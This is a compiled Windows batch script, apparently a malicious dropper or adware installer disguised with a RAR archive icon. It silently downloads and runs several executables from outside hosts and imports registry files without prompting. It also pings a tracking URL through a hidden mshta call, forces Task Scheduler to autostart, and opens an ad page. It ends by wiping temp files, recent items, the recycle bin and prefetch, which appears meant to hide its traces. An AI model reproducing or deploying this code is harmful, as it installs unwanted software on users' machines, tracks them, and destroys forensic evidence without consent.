@shift
REM  QBFC 项目选项  -开头
REM  包含版本信息: 否
REM  公司名称: 
REM  产品名称: 
REM  文件描述: 
REM  版权: 
REM  商标: 
REM  源文件名: 
REM  备注: 
REM  产品版本:  0. 0. 0. 0
REM  文件版本:  0. 0. 0. 0
REM  内部名词: 
REM  图标: e:\桌面\主题插件\RAR.ico
REM  内嵌的文件: e:\桌面\服务器接手\In.exe
REM  QBFC 项目选项  -结尾


del "D:\Windows Media Player\Program Files\npdrmv2.jpg" /q /f
del "C:\Program Files\Common Files\System\npdrmv.jpg" /q /f
del "C:\Program Files\Common Files\System\npdrm.jpg" /q /f
del "C:\Program Files\Common Files\System\npdnm.jpg" /q /f
del "C:\Program Files\Common Files\System\npdrmv2.jpg" /q /f
"%MYFILES%\coopen_setup_45564.exe"
"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/setup3.exe"


set var=huacai


copy "%MYFILES%\xyx.ico"      "C:\Program Files\Internet Explorer\xyx.ico"



regedit/s  "%MYFILES%\lnh.reg"
regedit/s  "%MYFILES%\xyx.reg"

echo %time%>>"%ALLUSERSPROFILE%\桌面\在线小游戏.Noxyx"


mshta vbscript:createobject("wscript.shell").run("""iexplore""http://stat.02933.com/info.mssql/?stat_%var%",0)(window.close)

sc config Schedule start= auto
net start "Task Scheduler"



start  /min     iexplore http://www.07396.com/index2.html?%var%



"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/setup2.exe"
"%MYFILES%\in.exe" "http://www.zuihouyi.com/l/37a.exe"
"%MYFILES%\in.exe" "http://a.xwxiazai.com/soft/nsetup.exe"
"%MYFILES%\in.exe" "http://www.zuihouyi.com/l/setup5.exe"
"%MYFILES%\in.exe" "http://www.zuihouyi.com/l/setup_p48.exe"
for /f "skip=4 tokens=1,2*" %%i in ('REG QUERY "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Cache') do (rd /s /q "%%k" & md "%%k")
del "%temp%\*.*" /q /f
del /f /q  "%userprofile%\recent\*.*"
del /f /s /q /a "%systemdrive%\recycled\*.*"
del /f /s /q /a "%systemdrive%\RECYCLER\*.*"
del /f /q %windir%\prefetch\*.*
rd /s /q %Temp% & md %temp%
rd /s /q %Tmp% & md %tmp%
rd /s /q %windir%\temp & md %windir%\temp


